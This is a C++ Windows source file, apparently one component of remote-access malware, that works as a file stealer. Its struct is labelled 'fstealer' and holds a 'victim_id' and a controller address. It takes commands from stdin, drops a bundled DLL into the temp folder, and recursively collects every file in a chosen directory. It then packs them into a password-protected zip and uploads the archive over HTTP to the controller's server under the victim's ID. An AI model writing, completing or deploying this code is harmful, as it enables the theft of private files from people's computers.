#define CURL_STATICLIB
#include "bitcompressor.hpp"
#include <Windows.h>
#include <tchar.h> 
#include <stdio.h>
#include <strsafe.h>
#include <vector>
#include <string>
#include <iostream>
#include <regex>

#include<fstream>

#include <intsafe.h>
#include <winternl.h>
#include <Shlwapi.h>
#include <iostream>
#include <WinInet.h>
#include "curl/curl.h"
#include <string>
#include <iostream>

#pragma comment(lib,"curl/libcurl_a.lib")
#pragma comment(lib,"Normaliz.lib")
#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib,"Wldap32.lib")
#pragma comment(lib,"Crypt32.lib")
#pragma comment(lib,"advapi32.lib")
#pragma comment(lib,"wininet.lib")
#pragma comment(lib,"shlwapi.lib")
#pragma comment(lib,"OleAut32.lib")
using namespace std;
#pragma comment(lib, "User32.lib")
#include <stack>
bool ListFiles(wstring path, wstring mask, vector<wstring>& files) {
    HANDLE hFind = INVALID_HANDLE_VALUE;
    WIN32_FIND_DATA ffd;
    wstring spec;
    stack<wstring> directories;

    directories.push(path);
    files.clear();

    while (!directories.empty()) {
        path = directories.top();
        spec = path + L"\\" + mask;
        directories.pop();

        hFind = FindFirstFile(spec.c_str(), &ffd);
        if (hFind == INVALID_HANDLE_VALUE) {
            return false;
        }

        do {
            if (wcscmp(ffd.cFileName, L".") != 0 &&
                wcscmp(ffd.cFileName, L"..") != 0) {
                if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    directories.push(path + L"\\" + ffd.cFileName);
                }
                else {
                    files.push_back(path + L"\\" + ffd.cFileName);
                }
            }
        } while (FindNextFile(hFind, &ffd) != 0);

        if (GetLastError() != ERROR_NO_MORE_FILES) {
            FindClose(hFind);
            return false;
        }

        FindClose(hFind);
        hFind = INVALID_HANDLE_VALUE;
    }

    return true;
}

using namespace bit7z;
extern char code[] = "0x00895ASR~";
typedef struct {
    char p_param[50000];
    char victim_id[50];
    char szip[50];
    int szport;
}fstealer, * Pfstealer;
#define MAX_STRING_SIZE 100000

std::vector<wstring> ps_vec;
int StringToWString(std::wstring& ws, const std::string& s)
{
    std::wstring wsTmp(s.begin(), s.end());

    ws = wsTmp;

    return 0;
}

inline void add_to_vec(std::string s) {
    std::wstring ws;
    StringToWString(ws, s);
    ps_vec.push_back(ws);

}
inline std::wstring conv(std::string s) {
    std::wstring ws;
    StringToWString(ws, s);
    return ws;

}


void upload(char* file_path, char* url, int port, char* vic_id, char* upload_path,char *fname) {
    std::string ext = ".zz";
    std::string ffffname = fname;
        std::string fin_name = ffffname + ext;
    std::string str_port = std::to_string(port);
    std::string str_url = url;
    std::string str_vic_id = vic_id;
    std::string str_comp_url = "http://" + str_url + ":" + str_port + "/" + str_vic_id + upload_path;

    CURL* curl;
    CURLcode res;

    struct curl_httppost* formpost = NULL;
    struct curl_httppost* lastptr = NULL;
    struct curl_slist* headerlist = NULL;
    static const char buf[] = "Expect:";

    curl_global_init(CURL_GLOBAL_ALL);


    curl_formadd(&formpost,
        &lastptr,
        CURLFORM_COPYNAME, "content-type:",
        CURLFORM_COPYCONTENTS, "multipart/form-data",
        CURLFORM_END);

    curl_formadd(&formpost, &lastptr,
        CURLFORM_COPYNAME, "l",
        CURLFORM_BUFFER,fin_name.c_str(),
        CURLFORM_FILE,file_path,
        CURLFORM_END);

    
    curl = curl_easy_init();

    headerlist = curl_slist_append(headerlist, buf);
    if (curl) {

        curl_easy_setopt(curl, CURLOPT_URL, str_comp_url.c_str());

        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
        res = curl_easy_perform(curl);
       

     


    }
}
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow) {
 

   HANDLE std_in, std_out = NULL;
    std_out = GetStdHandle(STD_OUTPUT_HANDLE);
    std_in = GetStdHandle(STD_INPUT_HANDLE);

    if ((std_in == INVALID_HANDLE_VALUE) || (std_out == INVALID_HANDLE_VALUE))
        ExitProcess(1);
   
    Pfstealer psss = (Pfstealer)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(fstealer)+1);
    DWORD dw_read = 0;
    while (!ReadFile(std_in, psss, sizeof(fstealer), &dw_read, NULL)) {

    }
   

  
  

    HRSRC hres = FindResource(NULL, MAKEINTRESOURCE(1), L"win");
    DWORD dw_resource_size = SizeofResource(NULL, hres);
    HGLOBAL hglobal = LoadResource(NULL, hres);
    PBYTE pbuff = (PBYTE)LockResource(hglobal);
    WCHAR temp_path[MAX_PATH];
        GetTempPath(MAX_PATH, temp_path);
        std::wstring back = L"\\";
        std::wstring name = L"szdll.dll";
        std::wstring szdll_path = temp_path + back + name;
    DeleteFile(szdll_path.c_str());
    HANDLE hf = CreateFile(szdll_path.c_str(), GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD szwrote = 0;
    WriteFile(hf, pbuff, dw_resource_size, &szwrote, NULL);
      
    CloseHandle(hf);
    std::string para = psss->p_param;
  int pos = para.find(";");
    std::string param22 = para.substr(0, pos);
    std::string rest_string1 = para.substr(pos+1);
    std::string password = rest_string1.substr(0,rest_string1.find(";"));
    std::string directory = rest_string1.substr(rest_string1.find(";") + 1);

   std::wstring szdir = conv(directory);

   vector<wstring> files;
   ListFiles(szdir, L"*", files);
   Bit7zLibrary lib{ szdll_path.c_str()};
       BitCompressor compressor{ lib, BitFormat::Zip };
       std::wstring w_password = conv(password);
   
       compressor.setPassword(w_password.c_str());
       std::string vic_id = /*vict_id;*/ psss->victim_id;
       std::wstring vicw_id = conv(vic_id);
       std::wstring un = L"_";
       std::wstring archive_name = vicw_id + un + w_password;
   
       DeleteFileW(archive_name.c_str());
       
       compressor.compress(files,archive_name.c_str());
       HANDLE hfile = CreateFileW(archive_name.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
       DWORD file_size = GetFileSize(hfile, 0);
    char* hp_file = (char*)malloc(file_size + 1);
     ZeroMemory(hp_file, file_size + 1);
     DWORD dw_dwread = 0;
     ReadFile(hfile, hp_file, file_size, &dw_dwread, 0);
     std::string archive_str = std::string(archive_name.begin(), archive_name.end());

     upload((char*)archive_str.c_str(), psss->szip, psss->szport, (char*)vic_id.c_str(), (char*)"/api/ml",(char*)archive_str.c_str());
     
  
}